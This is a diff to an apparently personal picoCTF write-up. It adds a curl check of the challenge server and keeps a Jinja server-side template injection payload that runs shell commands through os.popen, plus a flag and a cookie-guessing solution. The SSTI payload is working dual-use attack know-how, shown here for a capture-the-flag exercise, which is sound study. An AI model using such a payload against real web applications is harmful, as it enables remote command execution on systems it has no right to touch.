@@ -99,9 +99,24 @@ http://rescued-float.picoctf.net:62549/
 ## Solution:
 - The hint says that we have to use a technique called server side template injection
 - This is a type of vulnerability where a website will render user input as a template of some sort
+- I checked what the website was running on using
+  ```
+    shaunak@Shaunaks-MacBook-Pro ~ % curl -i http://mercury.picoctf.net:21485/
+    HTTP/1.1 302 FOUND
+    Content-Type: text/html; charset=utf-8
+    Content-Length: 209
+    Location: http://mercury.picoctf.net:21485/
+    Set-Cookie: name=-1; Path=/
+    
+    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+    <title>Redirecting...</title>
+    <h1>Redirecting...</h1>
+    <p>You should be redirected automatically to target URL: <a href="/">/</a>.  If not click the link.%                                                            shaunak@Shaunaks-MacBook-Pro ~ % 
+  ```
+- so the website is running on python, now i searched for vulnerabilities of ssti for python
 - i found a command vulnerability in the web {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
 - here whatever you put inside popen is treated as a command
-- so i write 
+- so i write this in the website
 ```
 {{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
 ```
@@ -143,7 +158,7 @@ picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_f5438664}
 - then i type in 1, it shows oatmeal raisin but that isnt the correct cookie
 - then i type 50, i shows invalid
 - then i type 30 it shows invalid
-- then i type 20 and i see a cookie, that means the correct cookie must be less than 30, so its realistic to just manually tyoe in and check all the cookies
+- then i type 20 and i see a cookie, that means the correct cookie must be less than 30, so its realistic to just manually type in and check all the cookies
 - so i keep on incrementing, it was a boring but nessasary
 - at cookie#18 i find the flag
   <img width="1466" height="749" alt="image" src="https://github.com/user-attachments/assets/4d0f1e5b-300d-4d71-9bb7-b4be5e4af70a" />
